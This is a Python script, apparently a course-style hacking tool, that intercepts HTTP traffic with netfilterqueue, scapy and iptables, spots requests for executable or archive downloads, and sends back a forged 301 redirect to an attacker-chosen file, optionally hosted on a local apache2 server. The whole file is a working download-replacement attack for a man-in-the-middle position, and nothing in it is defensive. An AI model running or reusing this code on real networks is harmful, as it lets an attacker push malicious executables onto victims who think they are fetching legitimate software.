import netfilterqueue
import subprocess
from scapy.all import Raw
from scapy.layers.inet import IP, TCP
import optparse
import re


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-m", "--machine", dest="machine", help="Machine to execute command on (local/remote)")
    parser.add_option("-d", "--download", dest="download", help="Extension to sniff and replace "
                                                                "(.exe/.zip/.deb/.dmg/.rpm/.tar/.gz)")
    parser.add_option("-r", "--replace", dest="replace", help="Replace download with"
                                                              "(http://example.com/file.exe)")
    (arguments, options) = parser.parse_args()

    download_extensions = [".exe", ".zip", ".deb", ".dmg", ".rpm", ".tar", ".gz"]

    if not arguments.machine or not bool(re.match(r"(^local$)|(^remote$)", arguments.machine)):
        print("[-] Invalid input; Please specify a machine; Use -h or --help for more info")
        exit(0)
    elif not arguments.download or arguments.download not in download_extensions:
        print("[-] Invalid input; Please specify an extension; Use -h or --help for more info")
        exit(0)
    elif not arguments.replace or not bool(re.match(r"^(https?://)([\w./\-]+)(\.[a-zA-Z]{2,4})$",
                                                    arguments.replace)):
        print("[-] Invalid input; Please specify an executable to replace with; Use -h or --help for more info")
        exit(0)
    else:
        return arguments


def local_machine_rules():
    subprocess.call(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] Setting iptables for local machine")


def remote_machine_rules():
    subprocess.call(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] Setting iptables for remote machine")


def check_machine(machine):
    if machine == "local":
        return local_machine_rules
    elif machine == "remote":
        return remote_machine_rules
    else:
        print("[-] Invalid machine")
        exit(0)


def start_localhost(replace):
    current_ip = subprocess.check_output(["hostname", "-I"]).decode().strip()
    if current_ip in replace:
        subprocess.call(["sudo", "service", "apache2", "start"])
        print("[+] Starting localhost")
    else:
        print("[+] Not starting localhost")


def stop_localhost(replace):
    current_ip = subprocess.check_output(["hostname", "-I"]).decode().strip()
    if current_ip in replace:
        subprocess.call(["sudo", "service", "apache2", "stop"])
        print("[-] Stopping localhost")
    else:
        print("[-] Not stopping localhost")


def set_load(packet, load):
    packet[Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum

    return packet


def process_packets(packet):
    scapy_packet = IP(packet.get_payload())  # Converted to scapy packet
    if scapy_packet.haslayer(Raw):
        if scapy_packet.haslayer(TCP) and scapy_packet[TCP].dport == 80:
            download_request = bytes(scapy_packet[Raw].load).decode("utf-8", errors="ignore")
            if arguments.download in download_request:
                ack_list.append(scapy_packet[TCP].ack)
                print("[+] Found potential request for a download")

        elif scapy_packet.haslayer(TCP) and scapy_packet[TCP].sport == 80:
            download_response = scapy_packet[TCP].seq
            if scapy_packet[TCP].seq in ack_list:
                print("[+] Replacing download")
                modified_load = "HTTP/1.1 301 Moved Permanently\nLocation: " + arguments.replace + "\n\n"
                modified_packet = set_load(scapy_packet, modified_load)
                ack_list.remove(download_response)

                packet.set_payload(bytes(modified_packet))

    packet.accept()


def queue_packets():
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(0, process_packets)
        print("\n[+] Starting downloads replacer")
        iptables_rule = check_machine(arguments.machine)
        iptables_rule()
        start_localhost(arguments.replace)
        print("[+] Downloads replacer started successfully!\n")
        queue.run()
    except KeyboardInterrupt:
        print("\n\n[-] Closing downloads replacer")
        subprocess.call(["sudo", "iptables", "--flush"])
        print("[-] Flushing iptables")
        stop_localhost(arguments.replace)
        print("[-] Downloads replacer ended successfully!")


ack_list = []
arguments = get_arguments()
queue_packets()
